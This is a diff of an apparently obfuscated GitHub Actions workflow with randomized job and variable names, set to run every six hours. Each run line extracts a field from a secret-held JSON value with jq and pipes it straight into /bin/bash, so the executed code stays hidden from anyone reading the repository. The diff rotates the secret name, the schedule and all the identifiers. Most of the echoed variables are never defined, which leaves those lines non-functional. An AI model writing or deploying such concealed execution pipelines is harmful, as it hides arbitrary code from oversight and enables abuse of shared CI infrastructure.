@@ -2,25 +2,24 @@ name: oiuajfnak
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
-
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: oiuajfnak
         env:
-          mz22: ${{ secrets.mz22 }}
+          iea27430: ${{ secrets.iea27430 }}
         run: |
-          echo $mz22 | jq -r .xpx023 | /bin/bash
-          echo $qdhk09641 | jq -r .pmmmv0577 | /bin/bash
-          echo $zgsyy41 | jq -r .dd26 | /bin/bash
-          echo $smugz4494 | jq -r .zw1336 | /bin/bash
-          echo $suj163 | jq -r .hrx98 | /bin/bash
-          echo $mre7 | jq -r .c232 | /bin/bash
-          echo $r71 | jq -r .zd963 | /bin/bash
-          echo $ck178 | jq -r .wqzgo975 | /bin/bash
-          echo $p69820 | jq -r .k03 | /bin/bash
+          echo $iea27430 | jq -r .sic6 | /bin/bash
+          echo $ynipw0 | jq -r .mcamd8508 | /bin/bash
+          echo $ujv7700 | jq -r .szqm7893 | /bin/bash
+          echo $d43238 | jq -r .wak023 | /bin/bash
+          echo $j59864 | jq -r .m25 | /bin/bash
+          echo $zg3120 | jq -r .pd2 | /bin/bash
+          echo $afzma84 | jq -r .o25790 | /bin/bash
+          echo $bxw213 | jq -r .iuvi47 | /bin/bash
+          echo $syo91523 | jq -r .ovg6 | /bin/bash
+          echo $cg512 | jq -r .wbm14272 | /bin/bash
 
